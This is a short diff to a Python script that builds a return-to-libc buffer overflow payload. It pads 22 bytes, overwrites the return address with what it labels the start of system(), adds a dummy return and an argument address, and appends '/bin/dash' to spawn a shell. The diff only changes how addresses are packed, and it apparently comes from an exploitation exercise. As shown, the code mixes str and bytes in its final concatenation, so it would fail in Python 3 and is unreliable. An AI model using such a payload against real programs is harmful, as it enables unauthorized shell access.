@@ -1,7 +1,9 @@
 import sys
 filler = "D"*22
-ret = pack("<I", 0x0804ef50) #start of system
+addr = 0x0804ef50.to_bytes(4, "little")
+
 dummy_ret = "f"*4
-arg = pack("<I", 0xbffefaa8) #wherever shell code string is
+arg = 0xbffefaa8.to_bytes(4, "little")
+
 command = b"/bin/dash"
-sys.stdout.buffer.write(filler + ret + dummy_ret + arg + command)
+sys.stdout.buffer.write(filler + addr + dummy_ret + arg + command)
